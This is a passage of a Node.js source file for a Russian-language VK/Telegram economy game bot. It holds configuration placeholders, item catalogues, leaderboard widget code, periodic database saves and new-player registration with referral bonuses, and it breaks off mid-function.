const {VK} = require('vk-io'); // вк-ио
const {Keyboard} = require('vk-io');
const vk = new VK(); 
const {updates, api, snippets, upload} = vk; 
const fs = require('fs');
const base = require('./base.json'); // база данных с игроками
const logs = require('./logs.json'); // логи игроков
const chats = require('./chats.json'); // беседы игроков
const Telegram = require('telegraf/telegram') // модуль телеграмма
const reportid = require('./reportid.json'); // база с репортами
const Telegraf = require('telegraf')
const TelegrafInlineMenu = require('telegraf-inline-menu') // кнопки для телеграмма
const bot = new Telegraf("токен телеграмм бота "); // токен телеграмм бота 
const telegram = new Telegram(`токен тг бота`) // токен тг бота
const moment = require('moment'); // модуль 
const clan = require('./clan.json') // база с кланами
const tlgrm = require('./tlgrm.json') // привязанные аккаунты игроков
const request = require('request-promise');
const chalk = require('chalk'); // модуль 
const adminchat = 2; // беседа админов
const modchat = 3; // беседа модераторов 
const ver = `1.0` // версия бота 


	let startedproc = 1
	while(startedproc < 99) {
		startedproc += Number(1)
	console.log(chalk.keyword(`orange`).bold.underline(`» Starting Bot ${ver}...`) + chalk.red.bold.underline(`${startedproc}%`)) // по приколу
}
// p.s : для обнуления базы игроков достаточно скопировать все, что находится в clearbase и перенести в base, сохранить

// Настройки бота //
// Для получения токена для страницы без подтверждения по номеру телефона, необходимо перейти по данной ссылке: https://vkhost.github.io , выбрать KATE MOBILE , получить токен, скопировать токен (не всю строку) и вставить ниже 
const page = new VK(); // создание страничного бота
 page.setOptions({token: `токен вашей страницы`}); // токен вашей страницы

// Данный токен нужен для установки виджета на главную страницу вашего бота, для этого установите приложение «Live Widget» в сообщество, перейдите в него, нажмите на ключ/шестерёнку и получите токен, который необходимо вставить чуть ниже.
const widgettoken = "токен группы с доступом к виджетам" //токен группы с доступом к виджетам

// Для получения токена для группы без подтверждения по номеру телефона, необходимо перейти по данной ссылке: https://vkhost.github.io , выбрать Настройки -> Сообщество -> Вписать ид группы ->  получить токен, скопировать токен (не всю строку) и вставить ниже 
vk.setOptions({ 
	token: "токен группы (бота)",  // токен группы (бота)
	apiMode: "parallel", // привед
	pollingGroupId: 12345678 // ид группы (бота)
});

const thisbotname = `Крутой бот` // имя вашего бота
const thisbotid = 12345678 // ид группы (бота)
const thisbotbeseda = `пока что не завели` // беседа вашего бота (ссылка, пример: https://vk.me/join/AJQ1d3ZZwxVAf3/E4sHsuyrI)
const thistelegabot = `joraTELEGRAMbot` // ссылка на вашего телеграмм бота (пример: joraTELEGRAMbot)
// Настройки бота //



// MCPETRADE ——— Автодонат (обработчик и сайт не нужен, всё находится в этом коде, достаточно просто указать значения)
const vipdesc = `скоро будет`; // описание випки / ссылка на товар, пример: vk.com/market-187706737?w=product-187706737_3495265
const premdesc = `скоро будет`; // описание премки / ссылка на товар, пример: vk.com/market-187706737?w=product-187706737_3495265
 // Для работы автодоната, вам необходимо подключить интеграцию с вк в настройках магазина MCPETRADE , подключить её к своей группе с ботом.В поле: «текст сообщения» вписать: %username% %product% (пример можно увидеть в mcpetrade.png)
const mcpetrade = {
"shop": 0, // ид магазина
"server": 0, // ид сервера
"premium": 0, // product , ид товара "Premium" в вашем магазине.
"vip": 0, // product , ид товара "V.i.P" в вашем магазине.
"studio": 0, // product , ид товара "Бизнес Киностудия" в вашем магазине.
"express": 0, // product , ид товара "Бизнес Межпланетный Экспресс" в вашем магазине.
"jorik": 0 // product , ид товара "Лучший питомец Жорик" в вашем магазине.
}
// !!! Телеграмм может не работать, если вы находитесь в россии (используйте впн, или установите бота на хостинг)

// больше ничего настраивать ну нужно, можешь запускать :)


//*******************************************************************************************************************

//*******************************************************************************************************************

// Created by vk.com/kovbaska_gg && vk.com/keyfqs 


const pets = [
{
	"name": "Улитка",
	"id": 1,
	"cost": 1000,
	"find": 500,
	"up": 250,
	"icon": "🐌"
},
{
	"name": "Лягушка",
	"id": 2,
	"cost": 25000,
	"find": 10000,
	"up": 2500,
	"icon": "🐸"
},
{
	"name": "Заяц",
	"id": 3,
	"cost": 500000,
	"find": 150000,
	"up": 50000,
	"icon": "🐰"
},
{
	"name": "Свинья",
	"id": 4,
	"cost": 300000000,
	"find": 10000000,
	"up": 15000000,
	"icon": "🐷"
},// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
{
	"name": "Лиса",
	"id": 5,
	"cost": 1250000000,
	"up": 75000000,
	"icon": "🦊",
	"find": 100000000
},
{
	"name": "Собака",
	"id": 6,
	"cost": 5000000000,
	"up": 100000000,
	"find": 500000000,
	"icon": "🐶"
},
{
	"name": "Гориллка",
	"id": 7,
	"cost": 180000000000,
	"up": 25000000000,
	"find": 35000000000,
	"icon": "🦍"
},
{
	"name": "Змея",
	"id": 8,
	"cost": 290000000000,
	"up": 36000000000000,
	"find": 54000000000,
	"icon": "🐍"
},
{
	"name": "Жорик",
	"id": 9,
	"cost": 70000000000,
	"up": 150000000000000,
	"find": 5000000000000,
	"icon": "🐑"
}
];
const biznesi = [
{
	"name": "Сервер в Minecraft",
	"id": 1,
	"pribil": 400,
	"cost": 10000,
	"workers": 2
},
{
	"name": "Шаурмичная",
	"id": 2,
	"pribil": 800,
	"cost": 50000,
	"workers": 5
},
{
	"name": "Сервер в SA:MP",
	"id": 3,
	"pribil": 1500,
	"cost": 75000,
    "workers": 10
},
{// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
	"name": "Ларёк",
	"id": 4,
	"pribil": 2000,
	"cost": 100000,
	"workers": 20
},
{
	"name": "Продажа палёных вещей",
	"id": 5,
	"pribil": 4000,
	"cost": 200000,
	"workers": 50
},
{
	"name": "Ресторан",
	"id": 6,
	"pribil": 6500,
	"cost": 300000,
	"workrers": 75
},
{
	"name": "Ночной клуб",
	"id": 7,
	"pribil": 10000,
	"cost": 3000000,
	"workers": 100
},
{
	"name": "Завод",
	"id": 8,
	"pribil": 15000,
	"cost": 4500000,
	"workrers": 150
},
{
	"name": "Магазин электронных сигарет",
	"id": 9,
	"pribil": 50000,
	"cost": 7000000,
	"workers": 200
},
{
	"name": "Шахта",
	"id": 10,
	"pribil": 70000,
	"cost": 15000000,
	"workers": 500
},
{
	"name": "Кальянная",
	"id": 11,
	"pribil": 100000,
	"cost": 25000000,
	"workers": 750
},
{
	"name": "Офис",
	"id": 12,
	"pribil": 220000,
	"cost": 50000000,
	"workers": 1000
},
{
	"name": "Порностудия",
	"id": 13,
	"pribil": 450000,
	"cost": 80000000,
	"workers": 2000
},
{
	"name": "Разработка Игр",
	"id": 14,
	"pribil": 600000,
	"cost": 150000000,
	"workers": 2500
},
{
	"name": "Нефтевышка",
	"id": 15,
	"pribil": 700000,
	"cost": 500000000,
	"workers": 3000
},
{
	"name": "Атомная электростанция",
	"id": 16,
	"pribil": 1000000,
	"cost": 800000000,
	"workers": 5000
},
{
	"name": "Бордель",
	"id": 17,
	"pribil": 60000000,
	"cost": 2500000000,
	"workers": 5500
},
{
	"name": "Торговля Оружием",
	"id": 18,
	"cost": 10000000000,
	"pribil": 120000000,
	"workers": 9000
},
{
	"name": "Букмекерская Контора",
	"id": 19,
	"cost": 80000000000,
	"pribil": 1200000000,
	"workers": 15000
},
{
	"name": "Киностудия",
	"id": 20,
	"cost": 50000000000000,
	"pribil": 25000000000,
	"workers": 20000
},// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
{
	"name": "Межпланетный экспресс",
	"id": 21,
	"cost": 1000000000000,
	"pribil": 500000000000,
	"workers": 25000
}
	
	
	
];
const phones = [
	{
	"name": `Nokia 108`,
	"id": 1,
	"cost": 250
	},
	{
	"name": `Nokia 3310`,
	"id": 2,
	"cost": 500
	},
	{
	"name": `BQ 6200L Aurora`,
	"id": 3,
	"cost": 15000
	},
	{
	"name": `Sony Xperia XZ3`,
	"id": 4,
	"cost": 25000
	},
	{
	"name": `ASUS ZenFone 6`,
	"id": 5,
	"cost": 45000
	},
	{
	"name": `Xiaomi Mi Mix 3`,
	"id": 6,
	"cost": 60000
	},
	{
	"name": `Samsung Galaxy S10`,
	"id": 7,
	"cost": 85000
	},
	{// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
	"name": `Torex FS2`,
	"id": 8,
	"cost": 125000
	},
	{
	"name": `iPhone XS MAX`,
	"id": 9,
	"cost": 210000
	},
	{
	"name": `Мегафон С1`,
	"id": 10,
	"cost": 350000
	}
];
const kvartiri = [
	{
	"name": `Чердак`,
	"id": 1,
	"cost": 150000
	},
	{
	"name": `Квартира в общежитии`,
	"id": 2,
	"cost": 10000000
	},
	{
	"name": `Однокомнатная квартира`,
	"id": 3,
	"cost": 45000000
	},
	{
	"name": `Двухкомнатная квартира`,
	"id": 4,
	"cost": 175000000
	},
	{
	"name": `Четырехкомнатная квартира`,
	"id": 5,
	"cost": 575000000
	},
	{
	"name": `Квартира в центре Москвы`,
	"id": 6,
	"cost": 765000000
	},
	{
	"name": `Двухуровневая квартира `,
	"id": 7,
	"cost": 1000000000
	},
	{
	"name": `Квартира с Евроремонтом`,
	"id": 8,
	"cost": 1660000000
	},
	{
	"name": `Пятиуровневая квартира в Москве`,
	"id": 9,
	"cost": 3000000000
	},
	{
	"name": `Квартира в пентхаусе La Belle Epoque`,
	"id": 10,
	"cost": 4500000000
	}
];// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
const homes = [
	{
	"name": `Коробка из-под холодильника`,
	"id": 1,
	"cost": 250
	},
	{
	"name": `Подвал`,
	"id": 2,
	"cost": 3000
	},
	{
	"name": `Палатка`,
	"id": 3,
	"cost": 3500
	},
	{
	"name": `Домик на дереве`,
	"id": 4,
	"cost": 5000
	},
	{
	"name": `Полуразрушенный дом`,
	"id": 5,
	"cost": 50000
	},
	{
	"name": `Дом в лесу`,
	"id": 6,
	"cost": 750000
	},
	{
	"name": `Деревянный дом`,
	"id": 7,
	"cost": 7000000
	},
	{
	"name": `Дача`,
	"id": 8,
	"cost": 20000000
	},
	{// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
	"name": `Кирпичный дом`,
	"id": 9,
	"cost": 45000000
	},
	{
	"name": `Коттедж`,
	"id": 10,
	"cost": 120000000
	},
	{
	"name": `Особняк`,
	"id": 11,
	"cost": 350000000
	},
	{
	"name": `Дом на Рублёвке`,
	"id": 12,
	"cost": 850000000
	},
	{
	"name": `Личный небоскрёб`,
	"id": 13,
	"cost": 1650000000
	},
	{
	"name": `Остров с особняком`,
	"id": 14,
	"cost": 3200000000
	},
	{
	"name": `Белый дом`,
	"id": 15,
	"cost": 5400000000
	}
];
const helicopters = [
	{
	"name": `Шарик с пропеллером`,
	"id": 1,
	"cost": 2
	},
	{
	"name": `RotorWay Exec 162F`,
	"id": 2,
	"cost": 56000000
	},
	{
	"name": `Robinson R44`,
	"id": 3,
	"cost": 80000000
	},
	{
	"name": `Hiller UH-12C`,
	"id": 4,
	"cost": 95000000
	},
	{
	"name": `AW119 Koala`,
	"id": 5,
	"cost": 125000000
	},
	{
	"name": `MBB BK 117`,
	"id": 6,
	"cost": 199000000
	},
	{
	"name": `Eurocopter EC130`,
	"id": 7,
	"cost": 230000000
	},
	{
	"name": `Leonardo AW109 Power`,
	"id": 8,
	"cost": 322000000
	},// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
	{
	"name": `Sikorsky S-76`,
	"id": 9,
	"cost": 512500000
	},
	{
	"name": `Bell 429WLG`,
	"id": 10,
	"cost": 640000000
	},
	{
	"name": `NHI NH90`,
	"id": 11,
	"cost": 660000000
	},
	{
	"name": `Kazan Mi-35M`,
	"id": 12,
	"cost": 780000000
	},
	{
	"name": `AgustaWestland AW101`,
	"id": 13,
	"cost": 1200000000
	},
	{
	"name": `Bell V-22 Osprey`,
	"id": 14,
	"cost": 3350000000
	},
	{
	"name": `Sikorsky S-92`,
	"id": 15,
	"cost": 4200000000
	}


];
const airplanes = [
	{
	"name": `Параплан`,
	"id": 1,
	"cost": 100000
	},
	{
	"name": `АН-2`,
	"id": 2,
	"cost": 350000
	},
	{
	"name": `Cessna-172E`,
	"id": 3,
	"cost": 700000
	}, // Created by vk.com/kovbaska_gg && vk.com/keyfqs 
	{
	"name": `Supermarine Spitfire`,
	"id": 4,
	"cost": 1000000
	},
	{
	"name": `BRM NG-5`,
	"id": 5,
	"cost": 1400000
	},
	{
	"name": `Cessna T210`,
	"id": 6,
	"cost": 2600000
	},
	{
	"name": `Beechcraft 1900D`,
	"id": 7,
	"cost": 5500000
	},
	{
	"name": `Cessna 550`,
	"id": 8,
	"cost": 8000000
	},
	{
	"name": `Hawker 4000`,
	"id": 9,
	"cost": 22400000
	},
	{
	"name": `Learjet 31`,
	"id": 10,
	"cost": 45000000
	},
	{
	"name": `Airbus A318`,
	"id": 11,
	"cost": 85000000
	},
	{
	"name": `F-35A`,
	"id": 12,
	"cost": 160000000
	},
	{
	"name": `Boeing 747-430 Custom`,
	"id": 13,
	"cost": 225500000
	},
	{
	"name": `C-17A Globemaster III`,
	"id": 14,
	"cost": 350000000
	},
	{
	"name": `F-22 Raptor`,
	"id": 15,
	"cost": 400000000
	},
	{
	"name": `Airbus 380 Custom`,
	"id": 16,
	"cost": 800000000
	},
	{
	"name": `B-2 Spirit Stealth Bomber `,
	"id": 17,
	"cost": 1659000000
	},
	{
	"name": `T-65B X-wing starfighter`,
	"id": 18,
	"cost": 3666000000
	}
];
const yachts = [
  {
  "name": `Ванна`,
  "id": 1,
  "cost": 10000
  },
  {
  "name": `Nauticat 331`,
  "id": 2,
  "cost": 10000000
  },
  {
  "name": `Nordhavn 56 MS`,
  "id": 3,
  "cost": 15000000
  },
  {
  "name": `Princess 60`,
  "id": 4,
  "cost": 25000000
  },
  {
  "name": `Azimut 70`,
  "id": 5,
  "cost": 35000000
  },
  {
  "name": `Dominator 40M`,
  "id": 6,
  "cost": 50000000
  },
  {
  "name": `Moonen 124`,
  "id": 7,
  "cost": 60000000
  },
  {
  "name": `Wider 150`,
  "id": 8,
  "cost": 65000000
  },
  {
  "name": `Palmer Johnson 42M SuperSport`,
  "id": 9,
  "cost": 80000000
  },
  {
  "name": `Wider 165`,
  "id": 10,
  "cost": 85000000
  },
  {
  "name": `Eclipse`,
  "id": 11,
  "cost": 150000000
  },
  {
  "name": `Dubai`,
  "id": 12,
  "cost": 300000000
  },
  {
  "name": `Streets of Monaco`,
  "id": 13,
  "cost": 950000000
  } 
];
const cars = [
	{
	"name": `Самокат`,
	"id": 1,
	"cost": 500
	},
	{
	"name": `Велосипед`,
	"id": 2,
	"cost": 12500
	},
	{
	"name": `Гироскутер`,
	"id": 3,
	"cost": 15000
	},
	{
	"name": `Сегвей`,
	"cost": 65000,
	"id": 4
	},
	{
	"name": `Мопед`,
	"id": 5,
	"cost": 125000
	},
	{
	"name": `Мотоцикл`,
	"id": 6,
	"cost": 560000
	},
	{
	"name": `ВАЗ 2109`,
	"id": 7,
	"cost": 1300000
	},
	{
	"name": `Квадроцикл`,
	"id": 8,
	"cost": 2000000
	},
	{
	"name": `Багги`,
	"id": 9,
	"cost": 3300000
	},
	{
	"name": `Вездеход`,
	"id": 10,
	"cost": 7500000
	},
	{
	"name": `Лада Xray`,
	"id": 11,
	"cost": 15000000
	},
	{
	"name": `Audi Q7`,
	"id": 12,
	"cost": 20000000
	},
	{
	"name": `BMW X6`,
	"id": 13,
	"cost": 23500000
	},
	{
	"name": `Toyota FT-HS`,
	"id": 14,
	"cost": 28000000
	},
	{
	"name": `Mercedes-Benz G500`,
	"id": 15,
	"cost": 32200000
	},
	{
	"name": `Subaru WRX STI`,
	"id": 16,
	"cost": 32700000
	},
	{
	"name": `Lamborghini Veneno`,
	"id": 17,
	"cost": 64500000
	},
	{
	"name": `Tesla Roadster`,
	"id": 18,
	"cost": 74500000
	},
	{
	"name": `Yamaha YZF R6`,
	"id": 19,
	"cost": 95000000
	},
	{
	"name": `Bugatti Chiron`,
	"id": 20,
	"cost": 100500000
	},
	{
	"name": `Ferrari LaFerrari`,
	"id": 21,
	"cost": 139000000
	},
	{
	"name": `Koenigsegg Regera`,
	"id": 22,
	"cost": 150000000
	},
	{
	"name": `Tesla Semi`,
	"id": 23,
	"cost": 275000000
	},
	{
	"name": `Venom GT`,
	"id": 24,
	"cost": 325000000
	},
	{
	"name": `Rolls-Royce`,
	"id": 25,
	"cost": 750000000
	},
	{
	"name": `Thrust SSC`,
	"id": 26,
	"cost": 1550000000
	},
	{
	"name": `Devel Sixteen`,
	"id": 27,
	"cost": 1930000000
	}
];
      
const rotateText = {
	q: 'q',
	w: 'ʍ',
	e: 'ǝ',
	r: 'ɹ',
	t: 'ʇ',
	y: 'ʎ',
	u: 'u',
	i: 'ᴉ',
	o: 'o',
	p: 'p',
	a: 'ɐ',
	s: 's',
	d: 'd',
	f: 'ɟ',
	g: 'ƃ',
	h: 'ɥ',
	j: 'ɾ',
	k: 'ʞ',
	l: 'l',
	z: 'z',
	x: 'x',
	c: 'ɔ',
	v: 'ʌ',
	b: 'b',
	n: 'n',
	m: 'ɯ',

	й: 'ņ',
	ц: 'ǹ',
	у: 'ʎ',
	к: 'ʞ',
	е: 'ǝ',
	н: 'н',
	г: 'ɹ',
	ш: 'm',
	щ: 'm',
	з: 'ε',
	х: 'х',
	ъ: 'q',
	ф: 'ф',
	ы: 'ıq',
	в: 'ʚ',
	а: 'ɐ',
	п: 'u',
	р: 'd',
	о: 'о',
	л: 'v',
	д: 'ɓ',
	ж: 'ж',
	э: 'є',
	я: 'ʁ',
	ч: 'һ',
	с: 'ɔ',
	м: 'w',
	и: 'и',
	т: 'ɯ',
	ь: 'q',
	б: 'ƍ',
	ю: 'oı'
}

function find(array, value) { 
for (var i = 0; i < array.length; i++) { 
if (array[i] == value) return i; 
} 
return -1; 
};




setInterval(function(){ 
        fs.writeFileSync("./clan.json", JSON.stringify(clan, null, "\t")) 
}, 2000); // обновление базы данных

setInterval(function(){ 
        fs.writeFileSync("./tlgrm.json", JSON.stringify(tlgrm, null, "\t")) 
}, 2000); // обновление базы данных



setInterval(function(){ 
        fs.writeFileSync("./base.json", JSON.stringify(base, null, "\t")) 
}, 2000); // обновление базы данных

setInterval(function(){ 
        fs.writeFileSync("./logs.json", JSON.stringify(logs, null, "\t")) 
}, 2000); // обновление базы данных

setInterval(function(){ 
        fs.writeFileSync("./reportid.json", JSON.stringify(reportid, null, "\t")) 
}, 2000); // обновление базы данных

setInterval(function(){ 
        fs.writeFileSync("./chats.json", JSON.stringify(chats, null, "\t")) 
}, 2000); // обновление базы данных



function rand(text) {
	let tts = Math.floor(text.length * Math.random())
	return text[tts]
}

function splitString(stringToSplit, separator) {
  var arrayOfStrings = stringToSplit.split(separator);
  return arrayOfStrings
}

const utils = { 
sp: (int) => { 
int = int.toString(); 
return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join(',').split('').reverse().join(''); 
}, 
rn: (int, fixed) => { 
if (int === null) return null; 
if (int === 0) return '0'; 
fixed = (!fixed || fixed < 0) ? 0 : fixed; 
let b = (int).toPrecision(2).split('e'), 
k = b.length === 1 ? 0 : Math.floor(Math.min(b[1].slice(1), 14) / 3), 
c = k < 1 ? int.toFixed(0 + fixed) : (int / Math.pow(10, k * 3) ).toFixed(1 + fixed), 
d = c < 0 ? c : Math.abs(c), 
e = d + ['', 'тыс', 'млн', 'млрд', 'трлн'][k]; 

e = e.replace(/e/g, ''); 
e = e.replace(/\+/g, ''); 
e = e.replace(/Infinity/g, 'ДОХЕРА'); 

return e; 
}, 
gi: (int) => { 
int = int.toString(); 

let text = ``; 
for (let i = 0; i < int.length; i++) 
{ 
text += `${int[i]}⃣`; 
} 

return text; 
}, 
decl: (n, titles) => { return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2] }, 
random: (x, y) => { 
return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x); 
}, 
pick: (array) => { 
return array[utils.random(array.length - 1)]; 
} 
}

function getRandomInRange(min, max) { 
return Math.floor(Math.random() * (max - min + 1)) + min; 
}; //Функция выбора рандомного числа

function rand(text) {
	let tts = Math.floor(text.length * Math.random())
	return text[tts]
}

function updateWidget() {
	let randm = getRandomInRange(1, 2)
if(randm === 1){
	var tops = []
	for(let i in base.bs){
		if(base.bs[i].topenabled === true && base.bs[i].rank < 4){
			tops.push({
				id: i,
				idvk: base.bs[i].id,
				lvl: base.bs[i].rating
			});
		}
	}
	tops.sort(function(a, b) {
		if (b.lvl > a.lvl) return 1
		if (b.lvl < a.lvl) return -1
		return 0
	})

	var script = {
		title: `Лучшие игроки`,
		head: [
			{
				text: 'Ник игрока'
			},
			{
				text: 'Деньги',
				align: 'right'
			},
			{
				text: 'Рейтинг',
				align: 'right'
			}
		],
		body: []
	}

	for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if (g <= 8) ups = `${ups}`
			if (g == 9) ups = `10`
			script.body.push([
				{
					icon_id: `id${tops[g].idvk}`,
					text: `${base.bs[tops[g].id].nick}`,
					url: `vk.com/id${tops[g].idvk}`
				},
				{
					text: `${utils.sp(base.bs[tops[g].id].balance)}$`
				},
				{
					text: `🏆${utils.sp(tops[g].lvl)}`
				},
			])
		}
	}
}
// Created by vk.com/kovbaska_gg && vk.com/keyfqs 
if(randm === 2){
if(!clan[0]) return
		var tops = []
	for(let i in clan){
			tops.push({
				id: i,
				idvk: base.bs[clan[i].owner].id,
				lvl: clan[i].rating
		})
	}
	tops.sort(function(a, b) {
		if (b.lvl > a.lvl) return 1
		if (b.lvl < a.lvl) return -1
		return 0
	})

	var script = {
		title: `Лучшие кланы`,
		head: [
			{
				text: 'Название клана'
			},
			{
				text: 'Рейтинг',
				align: 'right'
			}
		],
		body: []
	}

	if(tops.length > 10){
		for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if (g <= 8) ups = `${ups}`
			if (g == 9) ups = `10`
			script.body.push([
				{
					icon_id: `id${tops[g].idvk}`,
					text: `${clan[tops[g].id].name}`,
					url: `vk.com/id${tops[g].idvk}`
				},
				{
					text: `🏆${utils.sp(tops[g].lvl)}`
				},
			])
		}
	}
	}
	if(tops.length < 10){
		for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if (g <= 8) ups = `${ups}`
			if (g == 9) ups = `10`
			script.body.push([
				{
					icon_id: `id${tops[g].idvk}`,
					text: `${clan[tops[g].id].name}`,
					url: `vk.com/id${tops[g].idvk}`
				},
				{
					text: `🏆${utils.sp(tops[g].lvl)}`
				},
			])
		}
		}
	}
}
	request.post({ 
		url: 'https://api.vk.com/method/appWidgets.update', 
		form: { 
			v: '5.103', 
			type: 'table', 
			code: `return ${JSON.stringify(script)};`, 
			access_token: widgettoken // Специальный токен с уровнем доступа app_widgets 
	}},
	function(err, resp, body) {
	});
}

var now = new Date();
function addZero(num) { return ('0' + num).slice(-2); }

function nols(num) {
    if(num < 10) return('0' + num)
    if(num > 9) return(num)
}

function find(array, value) { 
for (var i = 0; i < array.length; i++) { 
if (array[i] == value) return i; 
} 
return -1; 
};


fs.readFile('example_log.txt', function (err, logData) {});
updates.use(async (context, next) => {
 if(context.isGroup)  return
 if(context.isOutbox) return
if(!base.id[context.senderId]){
	base.context.id += Number(1)
	base.id[context.senderId] = {
		id: base.context.id
		}
	vk.api.call("users.get", {
    user_ids: context.senderId
  }).then(res => {
    let months = new Date().getMonth()
    let days = new Date().getDate()
    let hour = new Date().getHours()
    let minute = new Date().getMinutes()
    let second = new Date().getSeconds()
	base.bs[base.context.id] = {
		keyb: 0,
		keyb1: `1 кнопка`,
		keyb2: `2 кнопка`,
		keyb3: `3 кнопка`, 
		balance: 500000,
		gold: 0,
		iron: 0,
		diamond: 0,
		materia: 0,
		nick: `${res[0].first_name}`,
		nicknotify: true,
		subscribed: false,
		carid: 0,
		carname: ``,
		rank: 1,
		reg: `${nols(days)}.${nols(months)}.${new Date().getFullYear()}, ${nols(hour)}:${nols(minute)}:${nols(second)}`,
		platform: false,
		id: context.senderId,
		rating: 0,
		work: 0,
		bank: 0,
		longnick: false,
		btc: 0,
		farm_btc: 0,
		biz: 0,
		paylimit: 0,
		givelimit: 0,
		paytime: 1440,
		givetime: 1440,
		worked: 0,
		bonus: 0,
		hide: false,
		topenabled: true,
		banreason: ``,
		promoactive: false,
		banned: false,
		bannedby: 0,
		bandays: 0,
		banhours: 0,
		banminutes: 0,
		banseconds: 0,
		refs: 0,
		payban: false,
		lastpay: ``,
		payalltime: 0,
		reportban: false,
		lastactivity: `${nols(days)}.${nols(months)}.${new Date().getFullYear()}, ${nols(hour)}:${nols(minute)}:${nols(second)}`,
		shotscount: 0,
		business: 0,
		notifications: true,
		exp: 1,
		level: 1,
		yachtname: ``,
		yachtid: 0,
		airplanename: ``,
		energy: 10,
		airplaneid: 0,
		helicopterid: 0,
		helicoptername: ``,
		shotprize: 0,
		petid: 0,
		petname: ``,
		petlvl: 0,
		peticon: ``,
		petlostchance: 0,
		pettimer: 0,
		homeid: 0,
		homename: ``,
		kvartiraid: 0,
		kvartiraname: ``,
		clan: 0,
		suprcase: 0,
		platcase: 0,
		photid: 0,
		kickbeseda: 0,
		phonename: ``,
		farms: 0,
		shots: 0,
		farmid: 0,
		farmtime: 0,
		biznesid: 0,
		biznesname: ``,
		biznespribil: 0,
		biznesworkers: 0,
		potioneffect: 0,
		potioneffecttime: 0,
		biznesmaxworkers: 0,
		biznesmoney: 0,
		tlgrmcode: 0,
		tlgrmid: 0,
		tlgrmpayacces: false,
		tlgrmpayid: 0,
		tlgrmpaycount: 0,
		tlgrmgivid: 0,
		tlgrmgivcount: 0,
		tlgrmblock: false,
		testthis: 0,
		farmname: ``,
			marriage: {
				partner: 0,
				requests: []
			}
		}
		let regby = false
		if(context.payload.message.ref) {
			let refid = context.payload.message.ref
			if(base.bs[refid]) {
				base.bs[base.context.id].balance += Number(25000000000)
				context.send(`» Вы перешли по реф.ссылке *id${base.bs[refid].id} (Пользователя) и получили +50,000,000,000$ на свой баланс 🤑`)
				base.bs[refid].balance += Number(250000000000)
				base.bs[refid].refs += 1
				regby = true
				vk.api.messages.send({user_id: base.bs[refid].id, message: `» *id${context.senderId} (${res[0].first_name}) перешёл по вашей реф.ссылке, вы получаете: +250,000,000,000$ 🤑`})
			if(regby == true) vk.api.messages.send({chat_id: modchat, message: `[#LOG]\n✅ *id${context.senderId} (${res[0].first_name}) Зарегистрировался по реф.ссылке *id${base.bs[refid].id} (Пользователя)\n🆔 ${base.id[context.senderId].id}`})
			
			if(regby == true) vk.api.messages.send({chat_id: adminchat, message: `[#LOG]\n✅ *id${context.senderId} (${res[0].first_name}) Зарегистрировался по реф.ссылке *id${base.bs[refid].id} (Пользователя)\n🆔 ${base.id[context.senderId].id}`})
			}
			}
			if(regby == false) vk.api.messages.send({chat_id: adminchat, message: `[#LOG]\n✅ *id${context.senderId} (${res[0].first_name}) Зарегистрировался в боте!\n🆔 ${base.id[context.senderId].id}`})
			if(regby == false) vk.api.messages.send({chat_id: modchat, message: `[#LOG]\n✅ *id${context.senderId} (${res[0].first_name}) Зарегистрировался в боте!\n🆔 ${base.id[context.senderId].id}`})
		
		return context.send({ 
message: `👋 Привет, *id${context.senderId} (${res[0].first_name}) !
🎯 Я - игровой бот [club${thisbotid}|${thisbotname}]!
🔮 Во мне довольно много развлекательных команд, которые помогут тебе скоротать время и найти новых друзей ❤️

✅ Узнай все мои функции - введи «Помощь» 👍
👀 Чтобы добавить меня в беседу просто нажми на соответствующую кнопку в нашей группе!
👉 Ссылка на игровую беседу:: ${thisbotbeseda}`, 
     keyboard: Keyboard.keyboard([  
      [ 
            Keyboard.textButton({ 
            label: '📚 Помощь', 
            color: Keyboard.POSITIVE_COLOR,
            payload: {
            	"command": "help"
            }
            })         
            
      ],
      [
            Keyboard.applicationButton({ 
            label: 'Добавить в беседу', 
            appId: 6441755,
            ownerId: -187706737
            })
      ]
   ])
   .inline(false)
  }) 
	})
	}

if (context.text) {
let hour = new Date().getHours()
let minute = new Date().getMinutes()
let second = new Date().getSeconds()
if(!logs[base.id[context.senderId].id]) {
	logs[base.id[context.senderId].id] = {
		text: ``
		}
}
let chattext = ``
if(context.isChat) chattext = `👥 Беседа: №${context.chatId},`
let timesend = `[🕐 ${nols(hour)}:${nols(minute)}:${nols(second)}]`
logs[base.id[context.senderId].id].text += `\n${timesend}, ${chattext} ✉️ ${context.text.slice(0, 360)}`
base.bs[base.id[context.senderId].id].lastactivity = `${nols(hour)}:${nols(minute)}:${nols(second)}`

    }
if(context.text) {

if(base.bs[base.id[context.senderId].id].banned == true || base.bs[base.id[context.senderId].id].tlgrmblock == true) {
	let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.text.includes(`выкл`)) {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.notifications = false
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
